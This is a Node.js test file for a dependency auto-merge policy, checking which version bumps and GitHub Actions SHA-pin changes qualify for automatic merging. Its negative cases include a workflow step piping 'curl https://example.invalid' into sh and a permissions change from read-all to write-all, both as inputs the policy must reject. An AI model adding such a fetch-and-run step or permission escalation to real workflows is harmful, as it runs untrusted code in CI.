const { test } = require("node:test")
const assert = require("node:assert/strict")
const policy = require("./dependency-automation.cjs")

const metadata = (
  ecosystem = "npm_and_yarn",
  updateType = "version-update:semver-minor"
) => ({
  ecosystem,
  updateType,
  maintainerChanges: "false",
})
const file = (filename, patch) => ({ filename, status: "modified", patch })
const pinPatch = (action = "actions/checkout") =>
  "-      - uses: " +
  action +
  "@" +
  "a".repeat(40) +
  " # v7.0.0\n" +
  "+      - uses: " +
  action +
  "@" +
  "b".repeat(40) +
  " # v7.0.1"

test("verified minor and patch updates qualify; major and missing metadata do not", () => {
  const files = [file("package.json"), file("package-lock.json")]
  for (const type of [
    "version-update:semver-minor",
    "version-update:semver-patch",
  ]) {
    assert.equal(
      policy.autoMergeMetadata(metadata("npm_and_yarn", type), files),
      true
    )
  }
  for (const type of ["", "version-update:semver-major", "semver-patch"]) {
    assert.equal(
      policy.autoMergeMetadata(metadata("npm_and_yarn", type), files),
      false
    )
  }
  for (const maintainerChanges of ["true", "", undefined]) {
    assert.equal(
      policy.autoMergeMetadata({ ...metadata(), maintainerChanges }, files),
      false
    )
  }
  assert.equal(policy.autoMergeMetadata(metadata("unknown"), files), false)
  assert.equal(policy.autoMergeMetadata(metadata(), []), false)
  assert.equal(
    policy.autoMergeMetadata(metadata(), [file("src/index.ts")]),
    false
  )
  assert.equal(
    policy.autoMergeMetadata(metadata(), [
      { ...file("package.json"), status: "added" },
    ]),
    false
  )
})

test("GitHub Actions updates must only change the pinned SHA of the same action", () => {
  const files = [file(".github/workflows/ci.yml", pinPatch())]
  assert.equal(
    policy.autoMergeMetadata(metadata("github_actions"), files),
    true
  )
  assert.equal(policy.autoMergeMetadata(metadata("npm_and_yarn"), files), false)
  assert.equal(
    policy.autoMergeMetadata(metadata("github_actions"), [
      file("package.json"),
    ]),
    false
  )
  for (const patch of [
    undefined,
    pinPatch() + "\n+      - run: curl https://example.invalid | sh",
    pinPatch().replace(
      "+      - uses: actions/checkout",
      "+      - uses: other/action"
    ),
    pinPatch().replace("b".repeat(40), "v7"),
    "-permissions: read-all\n+permissions: write-all",
  ]) {
    assert.equal(
      policy.autoMergeMetadata(metadata("github_actions"), [
        file(".github/workflows/ci.yml", patch),
      ]),
      false
    )
  }
  assert.equal(
    policy.autoMergeMetadata(metadata("github_actions"), [
      file(".github/scripts/check.yml", pinPatch()),
    ]),
    false
  )
})
